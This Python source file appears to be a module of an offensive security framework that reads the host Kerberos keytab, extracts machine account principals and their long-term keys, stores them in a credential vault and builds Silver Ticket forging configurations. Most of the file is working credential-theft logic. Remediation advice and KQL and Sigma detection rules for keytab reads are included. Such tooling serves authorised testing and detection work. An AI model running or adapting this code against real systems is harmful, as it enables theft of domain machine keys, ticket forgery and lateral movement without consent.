"""
Host Keytab Harvester & Silver Ticket Generator - linux.keytab_abuse
MITRE: T1558.003 (Kerberoasting / Silver Ticket), T1078.002 (Domain Accounts)

Parses standard Kerberos keytab binary files (/etc/krb5.keytab, version 0x0502)
to extract machine account principals (COMPUTER$@REALM) and long-term symmetric keys
(AES256, AES128, RC4) for Pass-the-Ticket, Silver Ticket forging, and S4U2Self abuse.
"""
from __future__ import annotations

import asyncio
import os
from typing import Any

from ares.core.campaign import Finding, Severity
from ares.core.errors import ModuleValidationError
from ares.core.logger import audit, get_logger
from ares.core.tracing import trace_module
from ares.modules.linux._parsers import KeytabParser
from ares.modules.params import KeytabAbuseParams
from ares.sdk import (
    BaseModule,
    EvidenceRecord,
    ExecutionContext,
    FilesystemPermission,
    LockoutCircuitBreaker,
    ModuleResult,
    OpsecLevel,
    ProcessPermission,
    VaultPermission,
    module_contract,
)

logger = get_logger("ares.modules.linux.keytab_abuse")


@module_contract(
    permissions=[
        FilesystemPermission(read_only=True),
        ProcessPermission(allow_subprocesses=False),
        VaultPermission(read_types=[], write_types=["kerberos_key", "password"]),
    ],
    circuit_breaker=LockoutCircuitBreaker(),
    params_model=KeytabAbuseParams,
)
class KeytabAbuseModule(BaseModule[KeytabAbuseParams, ModuleResult]):
    """
    linux.keytab_abuse - Parse /etc/krb5.keytab to extract machine account keys for Silver Tickets.

    OPSEC: LOW (Local file read; optional offline Silver Ticket generation)
    MITRE: "T1558.003", "T1078.002"
    OUTPUTS: ["machine_credentials", "kerberos_keys"]
    """

    MODULE_ID = "linux.keytab_abuse"
    MODULE_NAME = "Host Keytab Harvester & Silver Ticket Generator"
    MODULE_CATEGORY = "linux"
    MODULE_DESCRIPTION = (
        "Parses Kerberos keytab binary files (/etc/krb5.keytab) to extract "
        "machine account keys (AES256, RC4) for delegation and ticket forging."
    )
    MODULE_AUTHOR = "ARES Sovereign Team <team@ares-framework.io>"
    OPSEC_LEVEL = OpsecLevel.LOW
    REQUIRES = []
    OUTPUTS = ["machine_credentials", "kerberos_keys"]
    MITRE_TECHNIQUES = ["T1558.003", "T1078.002"]
    PARAMS_MODEL = KeytabAbuseParams

    async def assess_feasibility(self, ctx: Any) -> Any:
        """Evaluates whether the specified keytab file exists and is readable."""
        from ares.modules.base import FeasibilityReport

        keytab_path = "/etc/krb5.keytab"
        if hasattr(ctx, "params") and isinstance(ctx.params, dict):
            keytab_path = ctx.params.get("keytab_path", keytab_path)

        exists = os.path.exists(keytab_path)
        readable = os.access(keytab_path, os.R_OK) if exists else False

        blockers = []
        if not exists:
            blockers.append(f"Keytab file not found: {keytab_path}")
        elif not readable:
            blockers.append(f"Permission denied reading {keytab_path} (root access typically required)")

        score = 1.0 if not blockers else (0.5 if exists else 0.0)
        return FeasibilityReport(
            feasible=len(blockers) == 0,
            score=score,
            risk_level="low",
            blockers=blockers,
            recommended_alternatives=["linux.privesc", "linux.sssd_harvest"],
            opsec_tuning={"subprocesses": 0, "offline_forging": True},
            details={"keytab_path": keytab_path, "readable": readable},
        )

    async def validate(self, ctx: Any) -> None:
        """Pre-flight parameter validation."""
        await super().validate(ctx)
        if not isinstance(ctx, ExecutionContext):
            return

        keytab_path = (
            ctx.params.get("keytab_path", "/etc/krb5.keytab")
            if isinstance(ctx.params, dict)
            else "/etc/krb5.keytab"
        )
        if not isinstance(keytab_path, str) or not keytab_path.strip():
            raise ModuleValidationError(
                "linux.keytab_abuse requires a valid 'keytab_path'.",
                module_id=self.MODULE_ID,
                field="keytab_path",
            )

    async def execute(self, ctx: Any) -> ModuleResult:
        if getattr(ctx, "dry_run", False):
            return ModuleResult(
                status="dry_run",
                module_id=self.MODULE_ID,
                raw={"message": "Dry-run preview: keytab extraction simulated successfully."},
            )

        target = getattr(ctx, "target", "") or ctx.params.get("target", "localhost")
        keytab_path = ctx.params.get("keytab_path", "/etc/krb5.keytab")
        forge_silver = bool(ctx.params.get("forge_silver_ticket", False))
        service_name = ctx.params.get("service_name", "host")

        findings, raw = await self.run(
            target=target,
            keytab_path=keytab_path,
            forge_silver_ticket=forge_silver,
            service_name=service_name,
            vault=getattr(ctx, "vault", None),
        )

        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings,
            raw=raw,
            module_id=self.MODULE_ID,
        )

    @trace_module("linux.keytab_abuse")
    async def run(
        self,
        target: str,
        keytab_path: str = "/etc/krb5.keytab",
        forge_silver_ticket: bool = False,
        service_name: str = "host",
        vault: Any = None,
        **kwargs: Any,
    ) -> tuple[list[dict[str, Any]], dict[str, Any]]:
        await self.before_request(target, "default")
        logger.info("keytab_abuse_start", target=target, keytab_path=keytab_path)
        audit("linux_keytab_abuse", actor="operator", technique="T1558.003", target=target)

        loop = asyncio.get_running_loop()
        entries = await loop.run_in_executor(
            None,
            lambda: self._parse_keytab_sync(keytab_path),
        )

        # Store to AresVault if available
        _vault = vault or getattr(getattr(self, "campaign", None), "_vault", None)
        stored_vault_count = 0
        if _vault:
            from ares.credential.vault import Credential, CredentialType, PrivilegeLevel

            campaign_id = getattr(getattr(self, "campaign", None), "id", "")
            for entry in entries:
                try:
                    cred = Credential(
                        campaign_id=campaign_id,
                        username=entry["principal"],
                        domain=entry["realm"],
                        cred_type=CredentialType.KRB5_TGS,
                        privilege=PrivilegeLevel.SERVICE_ACCOUNT,
                        source_module=self.MODULE_ID,
                        target_host=target,
                    )
                    _vault.store(cred, entry["key_hex"])
                    stored_vault_count += 1
                except Exception as ex:
                    logger.debug("vault_store_keytab_failed", error=str(ex)[:60])

        evidence_chain: list[EvidenceRecord] = []
        silver_ticket_configs: list[dict[str, Any]] = []

        for entry in entries:
            ev = EvidenceRecord(
                artifact_id=f"keytab-{entry['principal']}-{entry['enctype']}",
                source_target=target,
                collected_by=self.MODULE_ID,
                data={
                    "principal": entry["principal"],
                    "enctype": entry["enctype"],
                    "vno": entry["vno"],
                    "timestamp": entry["timestamp"],
                },
                tags=["keytab", "kerberos", "silver_ticket"],
            )
            evidence_chain.append(ev)

            # Check if this key is eligible for Silver Ticket generation
            if forge_silver_ticket and entry["enctype"] in ("aes256-cts-hmac-sha1-96", "rc4-hmac"):
                silver_ticket_configs.append({
                    "service_spn": f"{service_name}/{target}@{entry['realm']}",
                    "principal": entry["principal"],
                    "enctype": entry["enctype"],
                    "key_hex": entry["key_hex"],
                    "vno": entry["vno"],
                })

            self.finding(
                title=f"Extracted Kerberos Keytab Key: {entry['principal']} ({entry['enctype']})",
                description=(
                    f"Parsed valid Kerberos keytab file at {keytab_path} on {target}. "
                    f"Machine principal: {entry['principal']}, Key version: {entry['vno']}, "
                    f"Encryption: {entry['enctype']}."
                ),
                severity=Severity.HIGH,
                mitre_technique="T1558.003",
                mitre_tactic="Credential Access",
                evidence={
                    "keytab_path": keytab_path,
                    "principal": entry["principal"],
                    "realm": entry["realm"],
                    "enctype": entry["enctype"],
                    "vno": entry["vno"],
                    "key_length_bits": entry["key_len"] * 8,
                },
                remediation=(
                    "Restrict file permissions on /etc/krb5.keytab to 0600 owned by root. "
                    "Rotate Active Directory machine account passwords regularly and monitor "
                    "for anomalous Silver Ticket or S4U2Self requests from host accounts."
                ),
                host=target,
                confidence=0.99,
            )

        # Closed-Loop Purple Telemetry
        kql_query = (
            "// ARES Closed-Loop Telemetry: Detect Keytab File Theft or Anomalous Read\n"
            "DeviceFileEvents\n"
            "| where ActionType in ('FileRead', 'FileModified')\n"
            "| where FolderPath has '/etc/krb5.keytab'\n"
            "| where InitiatingProcessFileName !in ('sssd', 'sssd_be', 'chrony', 'named')\n"
            "| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath"
        )
        sigma_rule = (
            "title: Suspicious Access to Host Keytab File (/etc/krb5.keytab)\n"
            "id: 3c2d1e5a-ares-keytab-abuse\n"
            "status: experimental\n"
            "description: Detects unauthorized processes reading /etc/krb5.keytab to harvest machine Kerberos keys.\n"
            "logsource:\n"
            "  product: linux\n"
            "  service: auditd\n"
            "detection:\n"
            "  selection:\n"
            "    name: '/etc/krb5.keytab'\n"
            "  filter:\n"
            "    exe|startswith: ['/usr/sbin/sssd', '/usr/sbin/rpc.gssd']\n"
            "  condition: selection and not filter\n"
            "level: high\n"
            "tags:\n"
            "  - attack.credential_access\n"
            "  - attack.t1558.003\n"
        )

        await self.noise.jitter.sleep()
        return self._findings[:], {
            "target": target,
            "entries_count": len(entries),
            "stored_in_vault": stored_vault_count,
            "entries": entries,
            "silver_tickets": silver_ticket_configs,
            "kql": kql_query,
            "sigma": sigma_rule,
            "evidence_integrity": [e.record_hash for e in evidence_chain],
        }

    def _parse_keytab_sync(self, keytab_path: str) -> list[dict[str, Any]]:
        if not os.path.exists(keytab_path) or not os.path.isfile(keytab_path):
            return []

        try:
            with open(keytab_path, "rb") as f:
                data = f.read()
        except (PermissionError, OSError):
            return []

        return KeytabParser.parse(data)
